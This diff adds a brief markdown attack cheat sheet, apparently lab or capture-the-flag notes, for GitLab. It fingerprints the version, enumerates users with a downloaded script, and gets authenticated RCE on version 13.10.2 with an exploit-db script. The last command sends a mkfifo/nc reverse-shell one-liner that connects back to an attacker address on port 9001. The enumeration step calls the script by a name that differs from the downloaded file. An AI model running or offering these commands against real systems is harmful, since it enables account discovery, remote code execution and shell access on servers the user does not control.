@@ -1,0 +1,34 @@
+# Version
+
+Register, log in, browse to `/help`. Yes, no other way
+
+# User enumeration
+
+Install tool
+
+```sh
+wget https://github.com/dpgg101/GitLabUserEnum/raw/refs/heads/main/gitlab_userenum.py
+chmod +x ./gitlab_userenum.py
+```
+
+Go
+
+```sh
+./gitlab_usernum.py -u "http://$target" -w /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt
+```
+
+# RCE
+
+## Authenticated RCE
+
+Gitlab 13.10.2 specific
+
+```sh
+curl https://www.exploit-db.com/raw/49951 -o gitlab_rce.py
+chmod +x ./gitlab_rce.py
+sudo apt update && sudo apt install djvulibre-bin -y
+```
+
+```sh
+./gitlab_rce.py -u 'user' -p 'pass' -t "http://$target" -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.9 9001 >/tmp/f'
+```
